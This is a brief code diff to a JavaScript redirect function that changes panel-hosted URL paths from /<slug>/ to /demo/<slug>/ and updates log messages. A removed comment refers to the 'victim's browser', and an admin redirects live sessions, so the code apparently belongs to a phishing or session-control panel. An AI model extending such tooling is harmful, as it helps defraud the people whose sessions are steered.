@@ -97,19 +97,19 @@ async function executeRedirect(io, sessionId, targetUrl, adminUserId, options = 
           console.log(`[redirect] stripped slug for hosted site: ${original} → ${targetUrl}`);
         }
       } else if (website && website.demo_slug && targetUrl && !/^https?:\/\//i.test(targetUrl) && targetUrl.charAt(0) === '/') {
-        // No own domain — site is served under /<slug>/ on the panel host.
-        // Prepend the slug so the URL resolves correctly on the victim's browser.
+        // No own domain — panel-hosted. Use /demo/<slug>/<page> same as local dev
+        // so Express slug routes handle it correctly on the hosted server too.
         const slug = website.demo_slug;
         const esc = slug.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
         const original = targetUrl;
-        // Strip any stale /demo/<slug>/ or /<slug>/ prefix first, then rebuild as /<slug>/
+        // Strip any existing /demo/<slug>/ or /<slug>/ prefix, then rebuild as /demo/<slug>/
         let pagePart = targetUrl
           .replace(new RegExp('^\\/demo\\/' + esc + '\\/', 'i'), '/')
           .replace(new RegExp('^\\/' + esc + '\\/', 'i'), '/')
           .replace(/^\//, '');
-        targetUrl = '/' + slug + '/' + pagePart;
+        targetUrl = '/demo/' + slug + '/' + pagePart;
         if (targetUrl !== original) {
-          console.log(`[redirect] panel-hosted — added slug prefix: ${original} → ${targetUrl}`);
+          console.log(`[redirect] panel-hosted — rewrote URL: ${original} → ${targetUrl}`);
         }
       }
     }
